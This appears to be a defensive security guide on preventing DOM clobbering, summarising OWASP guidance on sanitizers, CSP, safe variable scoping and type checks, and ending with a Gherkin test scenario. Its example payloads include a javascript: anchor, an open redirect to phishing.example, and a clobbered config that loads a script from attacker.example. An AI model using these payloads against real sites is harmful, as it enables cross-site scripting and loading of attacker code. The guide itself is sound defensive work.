# DOM Clobbering Prevention

## What it is

DOM clobbering is an HTML-only injection attack that needs no script tag. An attacker injects ordinary
HTML elements whose `id` or `name` matches a global variable or built-in API the page relies on, and
the browser's named-property lookup silently replaces that value with the injected element.

## The attack it stops

Browsers expose named HTML elements (those carrying an `id` or `name`) as properties on `window` and
`document`, and those named references are returned ahead of built-in APIs and developer-defined
properties. So when page code reads such a property for a sensitive operation, injected markup can
shadow it. The sheet's first example: `let redirectTo = window.redirectTo || '/profile/';
location.assign(redirectTo);` looks safe, but injecting `<a id=redirectTo
href='javascript:alert(1)'></a>` makes `window.redirectTo` resolve to that anchor, giving XSS, while
`<a id=redirectTo href='https://phishing.example/'></a>` gives an open redirect. The second example
clobbers a nested value: injecting `<a id=config></a><a id=config name=url
href='https://attacker.example/payload.js'></a>` sets `window.config.url`, which the page then uses as
a script `src`, loading attacker JavaScript. Because none of this needs a `<script>` tag, it works
exactly where script injection has been filtered by a sanitizer or blocked by policy.

## Controls

**Strip or isolate named attributes with a sanitizer (Guidelines 1 and 4).** Before inserting any
markup into the DOM, clean its `id` and `name` attributes. A robust sanitizer can remove named
properties entirely, apply namespace isolation (prefix the values with a constant string to avoid
collisions), or drop named properties that collide with the existing tree. OWASP recommends DOMPurify
or the browser Sanitizer API. DOMPurify by default removes collisions with built-in APIs (the
enabled-by-default `SANITIZE_DOM` option); to also cover custom variables and properties, turn on
`SANITIZE_NAMED_PROPS: true`, which isolates the namespace by prefixing `id` and `name` with
`user-content-`. With the Sanitizer API, use it only where its methods are supported, start from the
default configuration, and explicitly disallow `id` and `name` with `removeAttribute()`; in
unsupported browsers fall back to the DOMPurify configuration rather than inserting unsanitized HTML.

**Restrict script loading with Content-Security-Policy (Guideline 2).** A CSP that limits where
scripts may load from (for example the `script-src` directive) blocks the variant where clobbering
points a script source at an attacker origin. Be clear on its reach: CSP covers only some variants. It
does not stop clobbering that abuses already-present code, such as feeding a clobbered value into the
parameters of an evaluation construct like `eval()`.

**Freeze trusted configuration objects, with eyes open (Guideline 3).** Treat `Object.freeze()` as one extra layer,
nothing more, and apply it only to configuration objects your own code owns, builds from trusted
values, and holds in a local binding. Freezing locks the object's own data properties against being
swapped out, yet it reaches only one level deep: anything a nested object or a getter hands back
remains mutable. Never reach for it on `window`, `document`, or DOM nodes as a way to block
named-property clobbering, and note that `Object.freeze(window)` simply throws, since `window`
declines any request to seal itself against new properties. Rely instead on sanitizing markup and
keeping values in local variables.

**Write JavaScript that cannot be shadowed (Guidelines 5, 6, 11, 12, 13).**

- Always declare variables with `var`, `let`, or `const`; an undeclared binding is clobberable. Note
  that `let` does not create a property on `window` the way `var` does, so `window.VARNAME` can still
  be clobbered even when the `let` binding itself cannot.
- Do not store global variables on `document` or `window`, since those are exactly the objects an
  attacker can manipulate.
- Keep variables in local scope wherever possible; globals are the most exposed to being overwritten.
- Use unique variable names in production to reduce the chance of a naming collision.
- Encapsulate variables and functions inside objects or classes and keep them private, so they cannot
  be reached and overwritten from outside.

**Validate before trusting any document or window property (Guidelines 7 and 8).** Treat document
properties, including built-in ones, as untrusted until checked, because named-property access always
overshadows them, even right after a value is assigned. Before using such a property in a sensitive
operation, enforce a type check (for example with the `instanceof` operator); a clobbered value
resolves to an `Element` instance rather than the type you expected.

**Harden the runtime (Guidelines 9 and 10).** Run code in `strict` mode so accidental creation of a
global is an error and writing to a read-only property raises an error. Use browser feature detection
before using a feature, because an unsupported API behaves like an undefined (and therefore
clobberable) property.

## @security scenario

```gherkin
@security @owasp:dom-clobbering @usecase:clobbered-redirect
Scenario: Injected named HTML cannot override a redirect target
  Given a page that reads its redirect target from a declared local variable
  And untrusted markup is sanitized before it enters the DOM
  When an attacker injects "<a id=redirectTo href='javascript:alert(1)'></a>"
  Then the sanitizer strips or namespaces the "id" attribute
  And the redirect target keeps its declared default value
  And no attacker-controlled navigation or script execution occurs
```

This scenario is the canonical copy. When you apply this sheet to real code, add it to the repo's
shared feature-file index (see `bdd-comprehensive-testing`, "Storing BDD scenarios permanently") and
wire it into CI (its "CI/CD wiring") so it runs as a blocking autotest in the same place as every
other Gherkin scenario.

## The real guarantee

The structural control is twofold: never read a security decision from a `window` or `document`
named property, and sanitize `id` and `name` out of untrusted markup before it reaches the DOM.
Together those remove the namespace collision at its root, because the page no longer trusts the
lookup an attacker can shadow, and the attacker can no longer inject a colliding name. The scenario
checks one injected id against one variable; the combination of a declared local variable plus
id/name sanitization is what makes every colliding name harmless. Type checks, CSP, and freezing are
layers of defense in depth on top, not the guarantee itself.

## Sources

- OWASP DOM Clobbering Prevention Cheat Sheet (<https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html>, retrieved 2026-10-11) `[documented]`
